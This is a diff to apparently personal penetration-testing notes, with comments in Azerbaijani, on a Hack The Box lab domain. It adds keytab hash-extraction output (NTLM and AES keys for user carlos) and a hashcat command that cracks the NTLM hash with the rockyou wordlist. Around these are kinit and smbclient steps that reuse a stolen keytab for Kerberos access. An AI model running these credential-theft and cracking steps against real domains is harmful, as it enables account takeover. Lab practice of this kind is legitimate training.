@@ -56,7 +56,17 @@ export KRB5CCNAME=/tmp/krb5cc_647401107_FzYTA8 ( Əgər yoxdursa daxil etmək )
 kinit -kt /opt/specialfiles/carlos.keytab carlos@INLANEFREIGHT.HTB ( Keytab ilə TGT almaq )
 
 python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : INLANEFREIGHT.HTB
+        SERVICE PRINCIPAL : carlos/
+        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
+        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
+        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
 
+hashcat -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt
 smbclient -L //dc01/ -k -no-pass
 smbclient //dc01/carlos$ -k -no-pass
 
